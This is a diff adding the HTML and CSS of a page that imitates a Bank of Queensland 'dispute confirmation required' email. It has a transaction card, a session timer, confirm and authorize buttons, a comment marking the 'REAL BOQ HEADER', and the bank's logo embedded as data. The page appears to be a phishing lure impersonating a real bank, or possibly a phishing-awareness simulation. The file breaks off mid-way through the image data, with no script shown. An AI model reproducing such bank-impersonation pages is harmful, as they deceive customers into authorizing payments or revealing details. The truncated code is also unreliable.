@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BOQ — Dispute confirmation required</title>
+    <style>
+        /* ── Reset ── */
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* ── BOQ Tokens ── */
+        :root {
+            --boq-blue: #19252e;
+            --boq-dark: #19252e;
+            --boq-light-bg: #f3f3f3;
+            --boq-border: #c7ced2;
+            --amber: #F5A623;
+            --amber-bg: #FFF8EC;
+            --amber-border: #F5D88A;
+            --green: #1A6E44;
+            --green-bg: #EAF6EF;
+            --red: #19252e;
+            --red-bg: #FDECEA;
+            --text-primary: #19252e;
+            --text-secondary: #555;
+            --text-muted: #999;
+            --surface: #FFFFFF;
+            --page-bg: #f3f3f3;
+            --divider: #e2e2e2;
+            --font: "Gordita", Arial, Verdana, sans-serif;
+            --font-bold: "Gordita Bold", Arial, Verdana, sans-serif;
+        }
+
+        html,
+        body {
+            min-height: 100%;
+            font-family: var(--font);
+            font-size: 16px;
+            line-height: 1.6;
+            color: var(--text-secondary);
+            background: var(--page-bg);
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+        }
+
+        a {
+            color: var(--boq-blue);
+            text-decoration: none;
+        }
+        a:hover {
+            color: #16639f;
+            text-decoration: underline;
+        }
+
+        /* ── BOQ Header ── */
+        .boq-header {
+            background: #fff;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--divider);
+        }
+
+        .boq-header .header-inner {
+            max-width: 1170px;
+            margin: 0 auto;
+            padding: 0 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .boq-header .header-logo img {
+            height: 40px;
+            width: auto;
+            display: block;
+        }
+
+        .boq-header .header-contact {
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+
+        .boq-header .header-contact a {
+            color: var(--boq-blue);
+            font-weight: 600;
+        }
+
+        @media (max-width: 675px) {
+            .boq-header .header-contact {
+                font-size: 12px;
+            }
+            .boq-header .header-logo img {
+                height: 30px;
+            }
+        }
+
+        /* ── Session bar ── */
+        .session-bar {
+            background: var(--boq-dark);
+            padding: 8px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .session-bar span {
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .session-bar #timer {
+            color: #fff;
+            transition: color 0.3s;
+        }
+
+        .session-bar #timer.warning {
+            color: #fca5a5;
+        }
+
+        @media (max-width: 480px) {
+            .session-bar {
+                padding: 6px 14px;
+                font-size: 11px;
+                flex-wrap: wrap;
+                gap: 4px;
+            }
+        }
+
+        /* ── Main ── */
+        main {
+            flex: 1;
+            padding: 36px 16px 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        @media (min-width: 676px) {
+            main {
+                padding: 40px 30px 60px;
+            }
+        }
+
+        /* ── Step indicator ── */
+        .steps {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            margin-bottom: 28px;
+            width: 100%;
+            max-width: 640px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-muted);
+            flex: 1;
+            justify-content: center;
+            position: relative;
+        }
+
+        .step::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 1px;
+            height: 24px;
+            background: var(--divider);
+        }
+
+        .step:last-child::after {
+            display: none;
+        }
+
+        .step.active {
+            color: var(--boq-blue);
+        }
+        .step.done {
+            color: var(--green);
+        }
+
+        .step-num {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: var(--divider);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .step.active .step-num {
+            background: var(--boq-blue);
+            color: #fff;
+        }
+        .step.done .step-num {
+            background: var(--green);
+            color: #fff;
+        }
+
+        @media (max-width: 480px) {
+            .step {
+                font-size: 11px;
+            }
+            .steps {
+                gap: 0;
+            }
+        }
+
+        /* ── Email Card ── */
+        .card {
+            background: var(--surface);
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 640px;
+            overflow: hidden;
+        }
+
+        /* ── Email header ── */
+        .email-header {
+            padding: 20px 24px 16px;
+            border-bottom: 1px solid var(--divider);
+            background: #fafbfc;
+        }
+
+        .email-header .email-from-to {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 24px;
+            font-size: 14px;
+        }
+
+        .email-header .email-from-to .label {
+            color: var(--text-muted);
+            font-weight: 500;
+            min-width: 48px;
+        }
+
+        .email-header .email-from-to .value {
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        .email-header .email-subject {
+            margin-top: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-family: var(--font-bold);
+        }
+
+        .email-header .email-date {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        @media (max-width: 480px) {
+            .email-header {
+                padding: 14px 16px 12px;
+            }
+            .email-header .email-from-to {
+                font-size: 13px;
+                flex-direction: column;
+                gap: 2px;
+            }
+            .email-header .email-subject {
+                font-size: 15px;
+            }
+        }
+
+        /* ── Email body ── */
+        .email-body {
+            padding: 24px 24px 12px;
+            font-size: 15px;
+            line-height: 1.7;
+            color: var(--text-secondary);
+        }
+
+        .email-body p {
+            margin-bottom: 16px;
+        }
+
+        .email-body p:last-child {
+            margin-bottom: 0;
+        }
+
+        .email-body .greeting {
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .email-body .sign-off {
+            margin-top: 8px;
+            color: var(--text-primary);
+        }
+
+        .email-body .sign-off strong {
+            font-weight: 700;
+        }
+
+        @media (max-width: 480px) {
+            .email-body {
+                padding: 16px 16px 8px;
+                font-size: 14px;
+            }
+        }
+
+        /* ── Transaction block (within email) ── */
+        .txn-block-email {
+            margin: 12px 0 16px;
+            border: 1px solid var(--boq-border);
+            border-radius: 6px;
+            overflow: hidden;
+            background: #fafbfc;
+        }
+
+        .txn-top-email {
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            border-bottom: 1px solid var(--boq-border);
+            background: #f8f9fa;
+        }
+
+        .txn-merchant-email {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-family: var(--font-bold);
+        }
+        .txn-category-email {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 1px;
+        }
+        .txn-amount-email {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--red);
+            text-align: right;
+            font-family: var(--font-bold);
+        }
+        .txn-currency-email {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-align: right;
+            margin-top: 1px;
+        }
+
+        .txn-details-email {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+        }
+
+        .txn-detail-email {
+            padding: 9px 16px;
+            border-bottom: 1px solid var(--divider);
+            border-right: 1px solid var(--divider);
+            background: #fff;
+        }
+
+        .txn-detail-email:nth-child(2n) {
+            border-right: none;
+        }
+        .txn-detail-email:nth-last-child(-n+2) {
+            border-bottom: none;
+        }
+
+        .txn-detail-email label {
+            display: block;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-muted);
+            margin-bottom: 2px;
+            font-weight: 600;
+        }
+
+        .txn-detail-email span {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        @media (max-width: 480px) {
+            .txn-top-email {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .txn-amount-email {
+                text-align: left;
+                margin-top: 4px;
+            }
+            .txn-currency-email {
+                text-align: left;
+            }
+            .txn-details-email {
+                grid-template-columns: 1fr;
+            }
+            .txn-detail-email {
+                border-right: none !important;
+            }
+            .txn-detail-email:nth-last-child(-n+2) {
+                border-bottom: 1px solid var(--divider);
+            }
+            .txn-detail-email:last-child {
+                border-bottom: none !important;
+            }
+            .txn-merchant-email {
+                font-size: 15px;
+            }
+            .txn-amount-email {
+                font-size: 20px;
+            }
+        }
+
+        /* ── Attachment indicator ── */
+        .attachment-block {
+            margin: 12px 0 0;
+            padding: 10px 14px;
+            background: #f8f9fa;
+            border: 1px solid var(--divider);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .attachment-block .attach-icon {
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .attachment-block .attach-name {
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .attachment-block .attach-size {
+            color: var(--text-muted);
+            font-size: 12px;
+            margin-left: auto;
+        }
+
+        @media (max-width: 480px) {
+            .attachment-block {
+                flex-wrap: wrap;
+                font-size: 12px;
+            }
+            .attachment-block .attach-size {
+                margin-left: 0;
+            }
+        }
+
+        /* ── PS note ── */
+        .ps-note {
+            margin: 16px 0 8px;
+            padding: 12px 16px;
+            background: var(--amber-bg);
+            border-left: 3px solid var(--amber);
+            border-radius: 4px;
+            font-size: 14px;
+            color: #7A4F00;
+            line-height: 1.6;
+        }
+
+        .ps-note strong {
+            color: #5a3a00;
+        }
+
+        @media (max-width: 480px) {
+            .ps-note {
+                font-size: 13px;
+                padding: 10px 12px;
+            }
+        }
+
+        /* ── Divider ── */
+        .section-divider-email {
+            height: 1px;
+            background: var(--divider);
+            margin: 18px 24px 0;
+        }
+
+        /* ── Question block ── */
+        .question-block-email {
+            padding: 16px 24px 0;
+        }
+
+        .question-block-email h2 {
+            font-size: 17px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 6px;
+            font-family: var(--font-bold);
+        }
+
+        .question-block-email p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        @media (max-width: 480px) {
+            .question-block-email {
+                padding: 12px 16px 0;
+            }
+            .question-block-email h2 {
+                font-size: 16px;
+            }
+        }
+
+        /* ── Buttons ── */
+        .btn-group-email {
+            padding: 18px 24px 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .btn {
+            padding: 13px 16px;
+            border-radius: 6px;
+            border: none;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.15s, transform 0.1s;
+            font-family: var(--font);
+            min-width: 120px;
+            text-align: center;
+        }
+
+        .btn:hover {
+            filter: brightness(0.92);
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .btn:focus-visible {
+            outline: 3px solid var(--boq-blue);
+            outline-offset: 2px;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            filter: none;
+            transform: none;
+        }
+
+        .btn-confirm-dispute {
+            background: var(--green);
+            color: #fff;
+        }
+
+        .btn-authorize {
+            background: var(--boq-blue);
+            color: #fff;
+        }
+
+        @media (max-width: 480px) {
+            .btn-group-email {
+                grid-template-columns: 1fr;
+                padding: 14px 16px 16px;
+            }
+            .btn-authorize {
+                order: -1;
+            }
+        }
+
+        /* ── Security note ── */
+        .security-note-email {
+            margin: 0 24px 24px;
+            padding: 10px 14px;
+            background: #f8f9fa;
+            border: 1px solid var(--divider);
+            border-radius: 6px;
+            display: flex;
+            gap: 8px;
+            align-items: flex-start;
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        .security-note-email .security-note-icon {
+            font-size: 16px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .security-note-email strong {
+            color: var(--text-primary);
+        }
+
+        @media (max-width: 480px) {
+            .security-note-email {
+                margin: 0 16px 16px;
+                font-size: 12px;
+            }
+        }
+
+        /* ── Result states ── */
+        .result-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 40px 28px 36px;
+        }
+
+        .result-icon-ring {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 34px;
+            margin-bottom: 18px;
+        }
+
+        .result-screen h2 {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            color: var(--text-primary);
+            font-family: var(--font-bold);
+        }
+
+        .result-screen p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            max-width: 380px;
+            line-height: 1.6;
+            margin-bottom: 6px;
+        }
+
+        .result-ref {
+            margin-top: 18px;
+            padding: 10px 16px;
+            background: var(--page-bg);
+            border-radius: 6px;
+            font-size: 13px;
+            color: var(--text-muted);
+            width: 100%;
+            max-width: 340px;
+        }
+
+        .result-ref strong {
+            color: var(--text-secondary);
+        }
+
+        .btn-next-steps {
+            margin-top: 20px;
+            padding: 12px 28px;
+            border-radius: 6px;
+            border: none;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: var(--font);
+            transition: background 0.15s;
+            text-decoration: none;
+            display: inline-block;
+            color: #fff;
+        }
+
+        .btn-next-steps:hover {
+            filter: brightness(0.9);
+        }
+
+        .btn-confirmed-next {
+            background: var(--green);
+        }
+        .btn-denied-next {
+            background: var(--boq-blue);
+        }
+
+        /* ── BOQ Footer ── */
+        .boq-footer {
+            background: var(--boq-dark);
+            color: #fff;
+            padding: 24px 0;
+            margin-top: auto;
+        }
+
+        .boq-footer .footer-inner {
+            max-width: 1170px;
+            margin: 0 auto;
+            padding: 0 15px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .boq-footer .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px 24px;
+        }
+
+        .boq-footer .footer-links a {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .boq-footer .footer-links a:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        .boq-footer .footer-copy {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        @media (max-width: 675px) {
+            .boq-footer .footer-inner {
+                flex-direction: column;
+                gap: 12px;
+                text-align: center;
+            }
+            .boq-footer .footer-links {
+                justify-content: center;
+            }
+        }
+
+        /* ── Responsive tweaks ── */
+        @media (max-width: 480px) {
+            .result-screen {
+                padding: 30px 16px 24px;
+            }
+            .result-screen h2 {
+                font-size: 20px;
+            }
+        }
+
+        /* ── Spin animation ── */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ── REAL BOQ HEADER ── -->
+    <header class="boq-header" role="banner">
+        <div class="header-inner">
+            <a class="header-logo" href="#" title="Bank of Queensland">
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGMAAAAbCAYAAABoSjE5AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Q0MxMTUzOTI2MDI3MTFFOUFCOTRFNDc5OTlCQzU1NkMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Q0MxMTUzOTM2MDI3MTFFOUFCOTRFNDc5OTlCQzU1NkMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDQzExNTM5MDYwMjcxMUU5QUI5NEU0Nzk5OUJDNTU2QyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDQzExNTM5MTYwMjcxMUU5QUI5NEU0Nzk5OUJDNTU2QyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PoBsk+oAABUuSURBVHja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